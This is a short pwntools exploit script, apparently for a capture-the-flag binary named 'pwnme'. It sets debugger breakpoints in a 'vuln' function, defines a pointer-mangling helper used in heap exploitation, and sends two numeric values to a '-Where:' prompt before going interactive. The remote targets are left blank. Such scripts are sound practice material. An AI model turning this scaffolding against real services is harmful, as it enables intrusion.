#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('pwnme', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
mangle = lambda val, adrs: 	(adrs >> 12) ^ val

cmd=f'''
b* vuln+77
b* vuln+118
'''

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))


def GDB():
    if args.DOCKER:
        gdb.attach(pid, exe=exe.path, 
            gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + cmd)
        pause()
    else:
        gdb.attach(p, gdbscript = cmd)
        input()


if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('')
    sleep(2)
    # pid = 
else:
    p = process([exe.path])

p.recvuntil(b'-Where:\n')
sl(p, b'60')
sl(p, b'21314')
p.interactive()
